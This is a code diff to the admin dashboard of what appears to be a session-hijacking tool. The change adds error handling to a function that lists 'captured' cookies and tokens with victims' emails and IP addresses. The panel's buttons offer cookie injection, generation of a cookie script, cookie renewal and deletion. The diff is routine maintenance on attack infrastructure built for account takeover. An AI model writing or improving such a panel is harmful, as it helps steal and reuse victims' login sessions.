@@ -268,47 +268,54 @@
         async function loadTokens(page = 1) {
             const search = document.getElementById('tokenSearch').value;
             const sort = document.getElementById('tokenSort').value;
-            const res = await fetch(`${API}/tokens?search=${encodeURIComponent(search)}&sort=${sort}&page=${page}&limit=30`, { headers: authHeaders() });
-            const data = await res.json();
-            document.getElementById('tokenCount').textContent = data.total + ' Total';
-            const tbody = document.getElementById('tokensTableBody');
-            if (!data.tokens.length) {
-                tbody.innerHTML = '<tr><td colspan="7" class="empty-state"><i class="fas fa-inbox"></i>No tokens captured yet.</td></tr>';
-                return;
+            try {
+                const data = await fetchJson(`${API}/tokens?search=${encodeURIComponent(search)}&sort=${sort}&page=${page}&limit=30`, { headers: authHeaders() });
+                document.getElementById('tokenCount').textContent = (data.total || 0) + ' Total';
+                const tbody = document.getElementById('tokensTableBody');
+                if (!data.tokens || !data.tokens.length) {
+                    tbody.innerHTML = '<tr><td colspan="7" class="empty-state"><i class="fas fa-inbox"></i>No tokens captured yet.</td></tr>';
+                    return;
+                }
+                tbody.innerHTML = data.tokens.map((t, i) => `
+                    <tr class="token-row">
+                        <td>${(page-1)*30 + i + 1}</td>
+                        <td style="font-weight:600;">${t.email || '\u2014'}</td>
+                        <td style="font-size:11px;color:var(--muted);">${formatDate(t.created_at)}</td>
+                        <td style="font-size:11px;font-family:var(--font-heading);">${t.ip_address || '\u2014'}</td>
+                        <td>
+                            <span class="badge" style="font-size:9px;">
+                                ${t.token_type === 'cookie' ? '\uD83C\uDF6A Cookie' : '\uD83D\uDD11 Token'}
+                            </span>
+                        </td>
+                        <td style="font-size:11px;color:var(--muted);">${t.last_renewed ? formatDate(t.last_renewed) : '\u2014'}</td>
+                        <td class="actions-cell">
+                            <div class="action-group">
+                                <button class="action-btn script-btn" onclick="openDetailModal(${t.id})" title="View Details">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                                <button class="action-btn script-btn" onclick="injectCookie(${t.id})" title="Inject Cookie">
+                                    <i class="fas fa-plug"></i>
+                                </button>
+                                <button class="action-btn script-btn" onclick="generateCookieScript(${t.id})" title="Generate Cookie Script">
+                                    <i class="fas fa-code"></i> Script
+                                </button>
+                                <button class="action-btn renew-btn" onclick="renewCookies(${t.id}, this)" title="Renew Cookies">
+                                    <i class="fas fa-rotate"></i> Refresh
+                                </button>
+                                <button class="action-btn delete-btn" onclick="deleteToken(${t.id})" title="Delete Token">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch (e) {
+                console.error('Failed to load tokens:', e);
+                const tbody = document.getElementById('tokensTableBody');
+                if (tbody) {
+                    tbody.innerHTML = '<tr><td colspan="7" class="empty-state"><i class="fas fa-exclamation-triangle"></i> Unable to load tokens.</td></tr>';
+                }
             }
-            tbody.innerHTML = data.tokens.map((t, i) => `
-                <tr class="token-row">
-                    <td>${(page-1)*30 + i + 1}</td>
-                    <td style="font-weight:600;">${t.email || '\u2014'}</td>
-                    <td style="font-size:11px;color:var(--muted);">${formatDate(t.created_at)}</td>
-                    <td style="font-size:11px;font-family:var(--font-heading);">${t.ip_address || '\u2014'}</td>
-                    <td>
-                        <span class="badge" style="font-size:9px;">
-                            ${t.token_type === 'cookie' ? '\uD83C\uDF6A Cookie' : '\uD83D\uDD11 Token'}
-                        </span>
-                    </td>
-                    <td style="font-size:11px;color:var(--muted);">${t.last_renewed ? formatDate(t.last_renewed) : '\u2014'}</td>
-                    <td class="actions-cell">
-                        <div class="action-group">
-                            <button class="action-btn script-btn" onclick="openDetailModal(${t.id})" title="View Details">
-                                <i class="fas fa-eye"></i>
-                            </button>
-                            <button class="action-btn script-btn" onclick="injectCookie(${t.id})" title="Inject Cookie">
-                                <i class="fas fa-plug"></i>
-                            </button>
-                            <button class="action-btn script-btn" onclick="generateCookieScript(${t.id})" title="Generate Cookie Script">
-                                <i class="fas fa-code"></i> Script
-                            </button>
-                            <button class="action-btn renew-btn" onclick="renewCookies(${t.id}, this)" title="Renew Cookies">
-                                <i class="fas fa-rotate"></i> Refresh
-                            </button>
-                            <button class="action-btn delete-btn" onclick="deleteToken(${t.id})" title="Delete Token">
-                                <i class="fas fa-trash"></i>
-                            </button>
-                        </div>
-                    </td>
-                </tr>
-            `).join('');
         }
 
         function injectCookie(id) {
